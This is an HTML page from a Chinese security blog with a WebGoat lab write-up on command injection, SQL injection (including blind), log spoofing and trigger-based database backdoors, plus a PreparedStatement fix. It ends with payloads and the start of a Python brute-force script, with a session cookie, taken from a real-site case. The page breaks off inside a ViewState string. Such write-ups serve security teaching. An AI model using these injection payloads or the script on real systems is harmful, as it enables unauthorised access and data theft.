@@ -1,0 +1,709 @@
+<!doctype html>
+<html class="theme-next use-motion theme-next-mist">
+<head>
+  
+
+<meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+
+
+
+
+  <link rel="stylesheet" type="text/css" href="/vendors/fancybox/source/jquery.fancybox.css?v=2.1.5"/>
+
+
+<link rel="stylesheet" type="text/css" href="/css/main.css?v=0.4.3"/>
+
+
+    <meta name="description" content="关于计算机科学的学习经历与精彩文章分享。" />
+
+
+
+  <meta name="keywords" content="渗透测试," />
+
+
+
+
+
+  <link rel="shorticon icon" type="image/x-icon" href="/favicon.ico?v=0.4.3" />
+
+
+
+<script type="text/javascript" id="hexo.configuration">
+  var CONFIG = {
+    scheme: 'Mist',
+    analytics: {
+      google: ''
+    },
+    sidebar: 'post'
+  };
+</script>
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?351a523b2429a0dda1b90bb708a00fad";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+  <title> WebGoat Day3 Injection Flaws // Neurohazard </title>
+</head>
+
+<body>
+  <!--[if lte IE 8]>
+  <div style=' clear: both; height: 59px; padding:0 0 0 15px; position: relative;margin:0 auto;'>
+    <a href="http://windows.microsoft.com/en-US/internet-explorer/products/ie/home?ocid=ie6_countdown_bannercode">
+      <img src="http://7u2nvr.com1.z0.glb.clouddn.com/picouterie.jpg" border="0" height="42" width="820"
+           alt="You are using an outdated browser. For a faster, safer browsing experience, upgrade for free today or use other browser ,like chrome firefox safari."
+           style='margin-left:auto;margin-right:auto;display: block;'/>
+    </a>
+  </div>
+<![endif]-->
+
+  <div class="container one-column page-post-detail">
+    <div class="headband"></div>
+
+    <div id="header" class="header">
+      <div class="header-inner">
+        <h1 class="site-meta">
+  <span class="logo-line-before"><i></i></span>
+  <a href="/" class="brand">
+      <span class="logo">
+        <i class="icon-logo"></i>
+      </span>
+      <span class="site-title">Neurohazard</span>
+  </a>
+  <span class="logo-line-after"><i></i></span>
+</h1>
+
+<div class="site-nav-toggle">
+  <button>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+  </button>
+</div>
+
+<div class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu ">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/">
+            <i class="menu-item-icon icon-home"></i> <br />
+            首頁
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about">
+            <i class="menu-item-icon icon-about"></i> <br />
+            關於
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives">
+            <i class="menu-item-icon icon-archives"></i> <br />
+            歸檔
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags">
+            <i class="menu-item-icon icon-tags"></i> <br />
+            標籤
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-friend">
+          <a href="/friend">
+            <i class="menu-item-icon icon-friend"></i> <br />
+            友情鏈接
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-reading-list">
+          <a href="/reading-list">
+            <i class="menu-item-icon icon-reading-list"></i> <br />
+            閱讀清單
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+</div>
+
+
+      </div>
+    </div>
+
+    <div id="main" class="main">
+      <div class="main-inner">
+        <div id="content" class="content">
+          
+
+  <div id="posts" class="posts-expand">
+    
+
+  <div class="post post-type-normal ">
+    <div class="post-header">
+
+      
+      
+        <h1 class="post-title">
+          
+          
+            
+              WebGoat Day3 Injection Flaws
+            
+          
+        </h1>
+      
+
+      <div class="post-meta">
+        <span class="post-time">
+          發表於 2016-07-14
+        </span>
+
+        
+          <span class="post-category">
+            &nbsp; | &nbsp; 分類於
+            
+              <a href="/categories/信息安全/">信息安全</a>
+
+              
+              
+
+            
+          </span>
+        
+
+        
+          
+            <span class="post-comments-count">
+            &nbsp; | &nbsp;
+            <a href="/2016/07/14/webgoat-injection/#comments" >
+              <span class="post-comments-count ds-thread-count" data-thread-key="2016/07/14/webgoat-injection/"></span>
+            </a>
+          </span>
+          
+        
+      </div>
+    </div>
+
+    <div class="post-body">
+
+      
+      
+
+      
+        <h1 id="Command-Injection"><a href="#Command-Injection" class="headerlink" title="Command Injection"></a>Command Injection</h1><p>这一节讲的是命令注入攻击。该攻击对任何一个以参数驱动的站点来说都是一个严重威胁。</p>
+<blockquote>
+<p>It is always good practice to sanitize all input data, especially data that will used in OS command, scripts, and database queries.</p>
+</blockquote>
+<p>该页面就是一个选择所需查看的文档，然后下方显示文档内容的页面。其存在的漏洞就是后台可以执行用户输入的命令，当我们拦截之后，修改参数如下</p>
+<figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AccessControlMatrix.<span class="built_in">help</span>"&amp; netstat -an &amp; <span class="built_in">ipconfig</span> "</span><br></pre></td></tr></table></figure>
+<h1 id="Numeric-SQL-Injection"><a href="#Numeric-SQL-Injection" class="headerlink" title="Numeric SQL Injection"></a>Numeric SQL Injection</h1><p>数字型 SQL 注入</p>
+<figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> weather_data <span class="keyword">WHERE</span> station = <span class="number">101</span> <span class="keyword">or</span> <span class="number">1</span>=<span class="number">1</span></span><br></pre></td></tr></table></figure>
+<p>这里注意一下在 raw 和 paras 里修改的区别 有一个urlencode的过程<br><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">101</span> <span class="keyword">or</span> <span class="number">1</span>=<span class="number">1</span></span><br><span class="line">station=<span class="number">101</span>%20or%201%3d1</span><br></pre></td></tr></table></figure></p>
+<h1 id="String-SQL-Injection"><a href="#String-SQL-Injection" class="headerlink" title="String SQL Injection"></a>String SQL Injection</h1><p>字符串型 SQL 注入</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Your</span> Nam<span class="string">' or '</span><span class="number">1</span><span class="string">' ='</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
+<h1 id="Blind-Numeric-SQL-Injection"><a href="#Blind-Numeric-SQL-Injection" class="headerlink" title="Blind Numeric SQL Injection"></a>Blind Numeric SQL Injection</h1><p>最初的 SQL 如下</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">user_data</span> <span class="keyword">WHERE</span> userid=accountNumber;</span><br></pre></td></tr></table></figure>
+<p>我们可以控制的部分时 accountNumber</p>
+<p>首先尝试 payload<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">101 AND 1=1</span><br><span class="line">101 AND 1=2</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">user_data</span> <span class="keyword">WHERE</span> userid=<span class="number">101</span> <span class="keyword">AND</span> <span class="number">1</span>=<span class="number">1</span>  =&gt; <span class="literal">True</span> </span><br><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">user_data</span> <span class="keyword">WHERE</span> userid=<span class="number">101</span> <span class="keyword">AND</span> <span class="number">1</span>=<span class="number">2</span>  =&gt; <span class="literal">False</span></span><br></pre></td></tr></table></figure></p>
+<p>构造更复杂的情况</p>
+<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">101 </span><span class="keyword">AND</span> ((SELECT pin FROM pins WHERE cc_number=<span class="comment">'1111222233334444') &lt; 2500 );</span></span><br></pre></td></tr></table></figure>
+<p>然后通过不断的二分查找</p>
+<h1 id="Blind-String-SQL-Injection"><a href="#Blind-String-SQL-Injection" class="headerlink" title="Blind String SQL Injection"></a>Blind String SQL Injection</h1><p>与上一节类似的方法</p>
+<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">101 </span><span class="keyword">AND</span> (SUBSTRING((SELECT <span class="keyword">name</span> FROM pins WHERE cc_number=<span class="comment">'4321432143214321'), 1, 1) &lt; 'H' );</span></span><br><span class="line"><span class="symbol">101 </span><span class="keyword">AND</span> (SUBSTRING((SELECT <span class="keyword">name</span> FROM pins WHERE cc_number=<span class="comment">'4321432143214321'), 2, 1) &lt; 'h' );</span></span><br></pre></td></tr></table></figure>
+<h1 id="LAB-SQL-Injection"><a href="#LAB-SQL-Injection" class="headerlink" title="LAB: SQL Injection"></a>LAB: SQL Injection</h1><h2 id="Stage-1"><a href="#Stage-1" class="headerlink" title="Stage 1"></a>Stage 1</h2><p>第一步是字符串注入，要求以Neville的用户名，密码不知道的情况下登陆。</p>
+<p>因此需要拦截之后修改（一定要拦截后修改，因为直接在浏览器前端输入会有转义）</p>
+<figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">password<span class="string">' or '</span><span class="number">1</span><span class="string">' ='</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
+<h2 id="Stage-2"><a href="#Stage-2" class="headerlink" title="Stage 2"></a>Stage 2</h2><p>参数化查询可以有效防止 SQL 注入</p>
+<p>应该修改webgoat/lessons/SQLInjection/ViewProfile.java文件中的getEmployeeProfile方法，代码如下</p>
+<figure class="highlight hsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">String query = <span class="string">"SELECT employee.* "</span>+ <span class="string">"FROM employee,ownership WHERE employee.userid = ownership.employee_id and "</span>+ <span class="string">"ownership.employer_id = ? and ownership.employee_id = ?"</span><span class="comment">;</span></span><br><span class="line">try</span><br><span class="line">&#123;</span><br><span class="line">    Connection connection = WebSession.getConnections(s)<span class="comment">;</span></span><br><span class="line">    PreparedStatement statement = connection.prepareStatement(query,</span><br><span class="line">    ResultSet.TYPE_SCROLL_INSENSITIVE, ResultSet.CONCUR_READ_ONLY)<span class="comment">;</span></span><br><span class="line">    statement.setString(<span class="number">1</span>, userId)<span class="comment">;</span></span><br><span class="line">    statement.setString(<span class="number">2</span>, subjectUserId)<span class="comment">;</span></span><br><span class="line">    ResultSet answer_results = statement.executeQuery()<span class="comment">;</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="Stage-3"><a href="#Stage-3" class="headerlink" title="Stage 3"></a>Stage 3</h2><p>因为推断代码只会取结果集的第一个显示，所以要根据salary降序。</p>
+<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">employee_id=<span class="number">101</span><span class="meta">%</span><span class="number">20</span><span class="keyword">or</span><span class="meta">%</span><span class="number">201</span><span class="meta">%</span><span class="number">3</span>d<span class="number">1</span><span class="meta">%</span><span class="number">20</span>order<span class="meta">%</span><span class="number">20</span>by<span class="meta">%</span><span class="number">20</span>salary</span><br></pre></td></tr></table></figure>
+<h2 id="Stage-4"><a href="#Stage-4" class="headerlink" title="Stage 4"></a>Stage 4</h2><p>和 Stage 2 一样使用 PreparedStatement 来避免注入。</p>
+<h1 id="Database-Backdoors"><a href="#Database-Backdoors" class="headerlink" title="Database Backdoors"></a>Database Backdoors</h1><h2 id="Stage-1-1"><a href="#Stage-1-1" class="headerlink" title="Stage 1"></a>Stage 1</h2><figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">101</span>; <span class="keyword">update</span> employee <span class="built_in">set</span> salary=<span class="number">12000</span></span><br></pre></td></tr></table></figure>
+<h2 id="Stage-2-1"><a href="#Stage-2-1" class="headerlink" title="Stage 2"></a>Stage 2</h2><p>使用触发器来创建后门</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">101;<span class="keyword">CREATE</span> <span class="keyword">TRIGGER</span> myBackDoor <span class="keyword">BEFORE</span> <span class="keyword">INSERT</span> <span class="keyword">ON</span> employee <span class="keyword">FOR</span> <span class="keyword">EACH</span> <span class="keyword">ROW</span> <span class="keyword">BEGIN</span> <span class="keyword">UPDATE</span> employee <span class="keyword">SET</span> email=’john@hackme.com’ <span class="keyword">WHERE</span> userid = <span class="keyword">NEW</span>.userid</span><br></pre></td></tr></table></figure>
+<h1 id="Log-Spoofing"><a href="#Log-Spoofing" class="headerlink" title="Log Spoofing"></a>Log Spoofing</h1><p>现在是要求欺骗后台日志，也就是说一个人明明没有登陆进去，但它要在后台日志记录中显示登陆进去了。<br>因此可以在 username 处插入如下内容：</p>
+<figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Smith%0d%0aLogin Succeeded <span class="keyword">for</span> username: admin</span><br></pre></td></tr></table></figure>
+<h1 id="一则真实案例分析"><a href="#一则真实案例分析" class="headerlink" title="一则真实案例分析"></a>一则真实案例分析</h1><p><a href="http://www.wooyun.org/bugs/wooyun-2015-0133642/" target="_blank" rel="external">http://www.wooyun.org/bugs/wooyun-2015-0133642/</a></p>
+<p>一些使用的 payload 整理。</p>
+<p>发现问题的语句，注意payload最后的空格。<br><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">'<span class="comment">-- </span></span><br><span class="line">' <span class="keyword">or</span> <span class="number">1</span>=<span class="number">1</span><span class="comment">--</span></span><br></pre></td></tr></table></figure></p>
+<p>猜测数据库的查询语句<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> a,b,c,d,e,f <span class="keyword">FROM</span> db.<span class="keyword">table</span> <span class="keyword">WHERE</span> d <span class="keyword">LIKE</span> <span class="string">'%输入%'</span> <span class="keyword">AND</span> userid = <span class="string">'xx'</span></span><br></pre></td></tr></table></figure></p>
+<p>猜测数据库<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1'+'2%'<span class="comment">--</span></span><br><span class="line">12%'<span class="comment">--</span></span><br><span class="line"><span class="keyword">SELECT</span> a,b,c,d,e,f <span class="keyword">FROM</span> db.<span class="keyword">table</span> <span class="keyword">WHERE</span> d <span class="keyword">LIKE</span> <span class="string">'%1'</span>+<span class="string">'2%'</span><span class="comment">--%' AND userid = 'xx'</span></span><br><span class="line"><span class="keyword">SELECT</span> a,b,c,d,e,f <span class="keyword">FROM</span> db.<span class="keyword">table</span> <span class="keyword">WHERE</span> d <span class="keyword">LIKE</span> <span class="string">'%12%'</span><span class="comment">--%' AND userid = 'xx'</span></span><br></pre></td></tr></table></figure></p>
+<p>因为返回结果相同，所以判断是使用MSSQL(另外根据ASP的后缀，首先猜测的也应该是MSSQL)</p>
+<p>盲注数据库版本，这里的等号也可以用大于小于号</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">%' and substring((<span class="keyword">select</span> @@<span class="keyword">version</span>),<span class="number">22</span>,<span class="number">4</span>)=<span class="number">2008</span><span class="comment">-- </span></span><br><span class="line"><span class="keyword">SELECT</span> a,b,c,d,e,f <span class="keyword">FROM</span> db.<span class="keyword">table</span> <span class="keyword">WHERE</span> d <span class="keyword">LIKE</span> <span class="string">'%'</span> <span class="keyword">and</span> <span class="keyword">substring</span>((<span class="keyword">select</span> @@<span class="keyword">version</span>),<span class="number">22</span>,<span class="number">4</span>)=<span class="number">2008</span><span class="comment">-- %' AND userid = 'xx'</span></span><br></pre></td></tr></table></figure>
+<p>同理，可得知当前数据库用户名长度为14,当前数据库名长度为4。（下面脚本里要用到的）<br><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">%' <span class="keyword">and</span> len(user_name())=<span class="number">14</span><span class="comment">-- </span></span><br><span class="line">%' <span class="keyword">and</span> len(db_name())=<span class="number">14</span><span class="comment">--</span></span><br></pre></td></tr></table></figure></p>
+<p>最终跑脚本穷举<br><figure class="highlight julia"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> urllib2</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mycookie = <span class="string">".EASYSITE55=AEE337C01D32D34A9E1B34ADC54FCCF9A2A9CF08C7D5D9F09ECA5DA49E26CC6A2FC277A3710981B9AC49C8CFFE06A51C31CEA418592509926CB0C5D29307FBF165546531920B0C6610AA64D0C6F43CC1"</span> <span class="comment">#cookie请自行更新</span></span><br><span class="line"></span><br><span class="line">viewstate = <span class="string">"""/wEPDwUJNjcwNjk2ODMxD2QWBmYPFgIeBFRleHQFeTwhRE9DVFlQRSBodG1sIFBVQkxJQyAiLS8vVzNDLy9EVEQgWEhUTUwgMS4wIFRyYW5zaXRpb25hbC8vRU4iICJodHRwOi8vd3d3LnczLm9yZy9UUi94aHRtbDEvRFREL3hodG1sMS10cmFuc2l0aW9uYWwuZHRkIj5kAgEPZBYQAgUPFgIeB1Zpc2libGVoZAIGDxYCHgdjb250ZW50BRLmlL/lupzkv6Hmga/lhazlvIBkAgcPFgIfAgUf5pS/5bqc5L+h5oGv5YWs5byALEVhc3lTaXRlLEVTU2QCCA8WAh8CBTlDb3B5cmlnaHQgMjAxMSBieSBIdWlsYW4gSW5mb3JtYXRpb24gVGVjaG5vbG9neSBDby4sIEx0ZC5kAgkPFgIfAgUJRWFzeVNpdGUgZAIKDxYCHwIFIeS4reWbveS/nemZqeebkeedo+euoeeQhuWnlOWRmOS8mmQCDQ8WAh8CBQ1JTkRFWCwgRk9MTE9XZAIRDxYCHglpbm5lcmh0bWwFvg8uZXNzX2Vzc21lbnVfY3RsZXNzbWVudV9zcG1iY3RyIHtib3JkZXItYm90dG9tOiBUcmFuc3BhcmVudCAwcHggc29saWQ7IGJvcmRlci1sZWZ0OiBUcmFuc3BhcmVudCAwcHggc29saWQ7IGJvcmRlci10b3A6IFRyYW5zcGFyZW50IDBweCBzb2xpZDsgYm9yZGVyLXJpZ2h0OiBUcmFuc3BhcmVudCAwcHggc29saWQ7ICBiYWNrZ3JvdW5kLWNvbG9yOiBUcmFuc3BhcmVudDt9DQouZXNzX2Vzc21lbnVfY3RsZXNzbWVudV9zcG1iYXIge2N1cnNvcjogcG9pbnRlcjsgY3Vyc29yOiBoYW5kOyBoZWlnaHQ6MDt9DQouZXNzX2Vzc21lbnVfY3RsZXNzbWVudV9zcG1pdG0ge2N1cnNvcjogcG9pbnRlcjsgY3Vyc29yOiBoYW5kOyBjb2xvcjogVHJhbnNwYXJlbnQ7IGZvbnQtc2l6ZTogMTJwdDsgZm9udC13ZWlnaHQ6IG5vcm1hbDsgZm9udC1zdHlsZTogbm9ybWFsOyBib3JkZXItbGVmdDogVHJhbnNwYXJlbnQgMHB4IHNvbGlkOyBib3JkZXItYm90dG9tOiBUcmFuc3BhcmVudCAwcHggc29saWQ7IGJvcmRlci10b3A6IFRyYW5zcGFyZW50IDBweCBzb2xpZDsgYm9yZGVyLXJpZ2h0OiBUcmFuc3BhcmVudCAwcHggc29saWQ7fQ0KLmVzc19lc3NtZW51X2N0bGVzc21lbnVfc3BtaWNuIHtjdXJzb3I6IHBvaW50ZXI7IGN1cnNvcjogaGFuZDsgYmFja2dyb3VuZC1jb2xvcjogVHJhbnNwYXJlbnQ7IGJvcmRlci1sZWZ0OiBUcmFuc3BhcmVudCAxcHggc29saWQ7IGJvcmRlci1ib3R0b206IFRyYW5zcGFyZW50IDFweCBzb2xpZDsgYm9yZGVyLXRvcDogVHJhbnNwYXJlbnQgMXB4IHNvbGlkOyB0ZXh0LWFsaWduOiBjZW50ZXI7IHdpZHRoOiA1O2hlaWdodDogMDtkaXNwbGF5Om5vbmU7fQ0KLmVzc19lc3NtZW51X2N0bGVzc21lbnVfc3Btc3ViIHt6LWluZGV4OiAxMDAwOyBjdXJzb3I6IHBvaW50ZXI7IGN1cnNvcjogaGFuZDsgYmFja2dyb3VuZC1jb2xvcjogVHJhbnNwYXJlbnQ7IGZpbHRlcjpwcm9naWQ6RFhJbWFnZVRyYW5zZm9ybS5NaWNyb3NvZnQuU2hhZG93KGNvbG9yPSdEaW1HcmF5JywgRGlyZWN0aW9uPTEzNSwgU3RyZW5ndGg9MykgO2JvcmRlci1ib3R0b206IFRyYW5zcGFyZW50IDBweCBzb2xpZDsgYm9yZGVyLWxlZnQ6IFRyYW5zcGFyZW50IDBweCBzb2xpZDsgYm9yZGVyLXRvcDogVHJhbnNwYXJlbnQgMHB4IHNvbGlkOyBib3JkZXItcmlnaHQ6IFRyYW5zcGFyZW50IDBweCBzb2xpZDt9DQouZXNzX2Vzc21lbnVfY3RsZXNzbWVudV9zcG1icmsge2JvcmRlci1ib3R0b206IFRyYW5zcGFyZW50IDBweCBzb2xpZDsgYm9yZGVyLWxlZnQ6IFRyYW5zcGFyZW50IDBweCBzb2xpZDsgYm9yZGVyLXRvcDogVHJhbnNwYXJlbnQgMHB4IHNvbGlkOyAgYm9yZGVyLXJpZ2h0OiBUcmFuc3BhcmVudCAwcHggc29saWQ7IGJhY2tncm91bmQtY29sb3I6IFdoaXRlOyBoZWlnaHQ6IDBweDt9DQouZXNzX2Vzc21lbnVfY3RsZXNzbWVudV9zcG1pdG1zZWwge2JhY2tncm91bmQtY29sb3I6IFRyYW5zcGFyZW50OyBjdXJzb3I6IHBvaW50ZXI7IGN1cnNvcjogaGFuZDsgY29sb3I6IFRyYW5zcGFyZW50OyBmb250LXNpemU6IDEycHQ7IGZvbnQtd2VpZ2h0OiBub3JtYWw7IGZvbnQtc3R5bGU6IG5vcm1hbDt9DQouZXNzX2Vzc21lbnVfY3RsZXNzbWVudV9zcG1hcncge2ZvbnQtZmFtaWx5OiB3ZWJkaW5nczsgZm9udC1zaXplOiAxMHB0OyBjdXJzb3I6IHBvaW50ZXI7IGN1cnNvcjogaGFuZDsgYm9yZGVyLXJpZ2h0OiBUcmFuc3BhcmVudCAxcHggc29saWQ7IGJvcmRlci1ib3R0b206IFRyYW5zcGFyZW50IDFweCBzb2xpZDsgYm9yZGVyLXRvcDogVHJhbnNwYXJlbnQgMHB4IHNvbGlkOyBkaXNwbGF5Om5vbmU7fQ0KLmVzc19lc3NtZW51X2N0bGVzc21lbnVfc3BtcmFydyB7Zm9udC1mYW1pbHk6IHdlYmRpbmdzOyBmb250LXNpemU6IDEwcHQ7IGN1cnNvcjogcG9pbnRlcjsgY3Vyc29yOiBoYW5kO30NCi5lc3NfZXNzbWVudV9jdGxlc3NtZW51X3NwbWl0bXNjciB7d2lkdGg6IDEwMCU7IGZvbnQtc2l6ZTogNnB0O30NCmQCAg9kFgICAQ9kFgZmD2QWAmYPFgIfAWgWBAIBD2QWAgIDDxBkZBYAZAIDD2QWBGYPFCsAAhQrAAIPFgYeDVNlbGVjdGVkSW5kZXhmHgRTa2luBQdEZWZhdWx0HhNFbmFibGVFbWJlZGRlZFNraW5zaGQQFgZmAgECAgIDAgQCBRYGFCsAAmRkFCsAAmRkFCsAAmRkFCsAAmRkFCsAAg8WAh8BaGRkFCsAAg8WAh8BaGRkDxYGZmZmZmZmFgEFblRlbGVyaWsuV2ViLlVJLlJhZFRhYiwgVGVsZXJpay5XZWIuVUksIFZlcnNpb249MjAxMS4xLjUxOS4zNSwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0xMjFmYWU3ODE2NWJhM2Q0ZBYEAgQPDxYCHwFoZGQCBQ8PFgIfAWhkZAIBDxQrAAIPFgIfBGZkFQYIUGFnZUhvbWULUGFnZUN1cnJlbnQMUGFnZUZhdm9yaXRlClBhZ2VNYW5hZ2UIUGFnZVNpdGUOUGFnZUhvc3RTeXN0ZW0WBgICD2QWAgIBD2QWAgIBDw8WAh8BaGRkAgQPDxYCHwFoZGQCBQ8PFgIfAWhkZAIKD2QWAmYPZBYIZg9kFgICAQ9kFgQCAQ8PFgIfAWhkZAIDD2QWAgIBDw9kFgIeBWNsYXNzBQtNb2RFU1NIVE1MQ2QCAg9kFgYCAQ9kFgQCAQ8PFgIfAWhkZAIDD2QWAgIBDw9kFgIfBwULTW9kRVNTSFRNTENkAgMPZBYEAgEPDxYCHwFoZGQCAw9kFgICAQ8PZBYCHwcFEU1vZEdlbmVyYWxNb2R1bGVDFgICAQ9kFgJmD2QWBAIBD2QWAmYPDxYEHwAFBuijtOWGhR4HVG9vbFRpcAUq54K55Ye75q2k5aSE6L+b5YWl5oKo55qE55So5oi36LWE5paZ6aG16Z2iZGQCAw9kFgJmDw8WAh8ABQbms6jplIBkZAIFD2QWBAIBDw8WAh8BaGRkAgMPZBYCAgEPD2QWAh8HBQ5Nb2RlcGFzc2xvZ2luQxYCAgEPZBYCAgIPDxYCHwFoZGQCBA9kFgICAQ9kFgQCAQ8PFgIfAWhkZAIDD2QWAgIBDw9kFgIfBwUHTW9kYmpoQxYCAgEPZBYIZg8WAh8BaBYQAgMPEGRkFgFmZAIVDw8WAh8AZRYCHghSZWFkT25seQUEdHJ1ZWQCFw9kFgICAQ88KwAJAgAPFgYeDU5ldmVyRXhwYW5kZWRkHgxTZWxlY3RlZE5vZGVkHglMYXN0SW5kZXgCJ2QIFCsADAUsMDowLDA6MSwwOjIsMDozLDA6NCwwOjUsMDo2LDA6NywwOjgsMDo5LDA6MTAUKwACFgYfAAU8PGEgb25DbGljaz0ic2hvd05hbWUoZXZlbnQsJ+amguWGteeugOS7iycpIj7mpoLlhrXnroDku4s8L2E+HgVWYWx1ZQUBMR4IRXhwYW5kZWRoFCsAAwUHMDowLDA6MRQrAAIWBh8ABTw8YSBvbkNsaWNrPSJzaG93TmFtZShldmVudCwn5py65p6E566A5LuLJykiPuacuuaehOeugOS7izwvYT4fDQUCMTAfDmhkFCsAAhYGHwAFPDxhIG9uQ2xpY2s9InNob3dOYW1lKGV2ZW50LCfpooblr7znroDku4snKSI+6aKG5a+8566A5LuLPC9hPh8NBQIxMR8OaGQUKwACFgYfAAU8PGEgb25DbGljaz0ic2hvd05hbWUoZXZlbnQsJ+WPkeWxleinhOWIkicpIj7lj5HlsZXop4TliJI8L2E+Hw0FATIfDmhkFCsAAhYGHwAFPDxhIG9uQ2xpY2s9InNob3dOYW1lKGV2ZW50LCflt6XkvZzliqjmgIEnKSI+5bel5L2c5Yqo5oCBPC9hPh8NBQEzHw5oFCsABQUPMDowLDA6MSwwOjIsMDozFCsAAhYGHwAFPDxhIG9uQ2xpY2s9InNob3dOYW1lKGV2ZW50LCfnm5HnrqHliqjmgIEnKSI+55uR566h5Yqo5oCBPC9hPh8NBQIzMB8OaGQUKwACFgYfAAU8PGEgb25DbGljaz0ic2hvd05hbWUoZXZlbnQsJ+WFrOWRiumAmuefpScpIj7lhazlkYrpgJrnn6U8L2E+Hw0FAjMxHw5oZBQrAAIWBh8ABTw8YSBvbkNsaWNrPSJzaG93TmFtZShldmVudCwn5Lq65LqL5Lu75YWNJykiPuS6uuS6i+S7u+WFjTwvYT4fDQUCMzIf